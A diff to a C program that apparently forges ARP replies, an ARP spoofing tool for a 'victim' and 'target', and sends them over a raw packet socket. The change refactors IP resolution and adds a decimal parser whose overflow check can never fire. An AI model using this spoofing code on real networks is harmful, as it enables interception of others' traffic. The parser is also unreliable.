@@ -203,6 +203,25 @@ printf("Ethernet Header:\n");
     printf("TPA   : %s\n", inet_ntoa(tpa_addr));
 }
 
+uint32_t decimal_to_binary(const char *dec, uint32_t *out)
+{
+    if(!dec || !out)
+        return 1;
+    unsigned int ret = 0;
+    while(*dec)
+    {
+        if(*dec < '0' || *dec > '9')
+            return 1;
+        ret = ret * 10 + (*dec - '0');
+        dec++;
+    };
+    if (ret > 0xFFFFFFFF)
+        return 1;
+    *out = htonl(ret);
+    return 0;
+
+}
+
 int resolve_ip(const char *name_or_ip, uint32_t *out_nbo)
 {
     struct addrinfo hints;
@@ -218,22 +237,23 @@ int resolve_ip(const char *name_or_ip, uint32_t *out_nbo)
     hints.ai_socktype = 0;            /* pas de contrainte */
 
     rc = getaddrinfo(name_or_ip, NULL, &hints, &res);
-    if (rc != 0) {
-        /* getaddrinfo ne trouve pas -> échoue */
-        return -1;
+    if(rc == 0)
+    {
+        /* prend la première adresse IPv4 renvoyée */
+        struct sockaddr_in *sin = (struct sockaddr_in *)res->ai_addr;
+        *out_nbo = sin->sin_addr.s_addr; /* déjà en network byte order */
+    
+        /* (optionnel) debug : afficher l'IP résolue
+           inet_ntop(AF_INET, &sin->sin_addr, ipstr, sizeof(ipstr));
+           printf("%s -> %s\n", name_or_ip, ipstr);
+        */
+    
+        freeaddrinfo(res);
+        return 0;
     }
-
-    /* prend la première adresse IPv4 renvoyée */
-    struct sockaddr_in *sin = (struct sockaddr_in *)res->ai_addr;
-    *out_nbo = sin->sin_addr.s_addr; /* déjà en network byte order */
-
-    /* (optionnel) debug : afficher l'IP résolue
-       inet_ntop(AF_INET, &sin->sin_addr, ipstr, sizeof(ipstr));
-       printf("%s -> %s\n", name_or_ip, ipstr);
-    */
-
-    freeaddrinfo(res);
-    return 0;
+    if(decimal_to_binary(name_or_ip, out_nbo) == 0)
+        return 0;
+    return -1;
 }
 int main(int ac, char **av) 
 {
@@ -247,11 +267,9 @@ int main(int ac, char **av)
     {
         if(ft_memcmp(av[5], "-v", 3) == 0)
             flag = 1;
-        else if(ft_memcmp(av[5], "-d", 3) == 0)
-            flag = 2;
         else
         {
-            fprintf(stderr, "Last arg must be -v for verbose or -d for decimal notation of IP addresses\n");
+            fprintf(stderr, "For verbose mode use -v as last argument\n");
             return 1;
         }
     }
@@ -269,51 +287,26 @@ int main(int ac, char **av)
     }
     arp_ether_ipv4 *arp = malloc(sizeof(*arp));
     ft_memset(arp, 0, sizeof(arp_ether_ipv4));
-    // if(inet_pton(AF_INET, av[1], &arp->tpa) != 1 || inet_pton(AF_INET, av[3], &arp->spa) != 1)
-    // {
-    //     error_printer(1);
-    //     free(fake_header);
-    //     free(arp);
-    //     return 1;
-    // }
     u_int32_t tmp_ip;
-    if(flag != 2)
-    {
-        if (resolve_ip(av[3], &tmp_ip) != 0) {
-            fprintf(stderr, "Unable to resolve target '%s'\n", av[1]);
-            free(fake_header);
-            free(arp);
-            return 1;
-        }
-        ft_memcpy(&arp->tpa, &tmp_ip, sizeof(tmp_ip));
-        if(flag == 1)
-            printf("Target IP resolved: %s\n", inet_ntoa(*(struct in_addr *)&tmp_ip));
-        /* résout av[3] -> spa (IP de la victime) */
-        if (resolve_ip(av[1], &tmp_ip) != 0) {
-            fprintf(stderr, "Unable to resolve victim '%s'\n", av[3]);
-            free(fake_header);
-            free(arp);
-            return 1;
-        }
-        ft_memcpy(&arp->spa, &tmp_ip, sizeof(tmp_ip));
-        if(flag == 1)
-            printf("Victim IP resolved: %s\n", inet_ntoa(*(struct in_addr *)&tmp_ip));
+    if (resolve_ip(av[3], &tmp_ip) != 0) {
+        fprintf(stderr, "Unable to resolve target '%s'\n", av[1]);
+        free(fake_header);
+        free(arp);
+        return 1;
     }
-    else
-    {
-        // decimal notation
-        uint32_t ip_decimal = 0x0A000205; // 10.0.2.5
-        struct in_addr ip_addr;
-        char buf[INET_ADDRSTRLEN];
-
-        ip_addr.s_addr = htonl(ip_decimal);
-        if (inet_ntop(AF_INET, &ip_addr, buf, sizeof(buf)) != NULL) {
-            printf("IP: %s\n", buf);
-        }
-        return 0;
-
+    if(flag == 1)
+        printf("Target IP resolved: %s\n", inet_ntoa(*(struct in_addr *)&tmp_ip));
+    ft_memcpy(&arp->tpa, &tmp_ip, sizeof(tmp_ip));
+    if (resolve_ip(av[1], &tmp_ip) != 0) {
+        fprintf(stderr, "Unable to resolve victim '%s'\n", av[3]);
+        free(fake_header);
+        free(arp);
+        return 1;
     }
+    ft_memcpy(&arp->spa, &tmp_ip, sizeof(tmp_ip));
     int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
+    if(flag == 1)
+        printf("Victim IP resolved: %s\n", inet_ntoa(*(struct in_addr *)&tmp_ip));
     if (sock < 0) 
     {
         fprintf(stderr, "socket");
@@ -330,16 +323,16 @@ int main(int ac, char **av)
     ft_memcpy(addr.sll_addr, fake_header->dest_addr, ETH_ALEN);
 
     arp_ether_ipv4 *recv_arp = (arp_ether_ipv4 *)(buf1 + sizeof(ether_hdr));
-    
+    ft_memset(recv_arp, 0, sizeof(arp_ether_ipv4));
     size_t eth_len = sizeof(ether_hdr);
     size_t arp_len = sizeof(arp_ether_ipv4);
     size_t total = eth_len + arp_len;
-    uint8_t packet[1500]; // assez grand pour une trame Ethernet
+    uint8_t packet[64]; // assez grand pour une trame Ethernet
 
-    //en-tête ethernet
+    //header ethernet
     ft_memcpy(packet, fake_header, eth_len);
 
-    //trame ARP
+    //ARP body
     ft_memcpy(packet + eth_len, arp, arp_len);
 
     struct sigaction sa;
@@ -362,7 +355,7 @@ int main(int ac, char **av)
     }
 
 
-    // envoyer la trame complète
+    // envoi reply
     if(ret != -1)
     {
         ssize_t sent = sendto(sock, packet, total, 0,
@@ -374,6 +367,8 @@ int main(int ac, char **av)
         if(flag == 1)
             print_arp_packet("Sent ARP reply", arp, fake_header);
     }
+    if(stop)
+        printf("\nProcess interrupted, exiting...\n");
     free(fake_header);
     free(arp);
     close(sock);
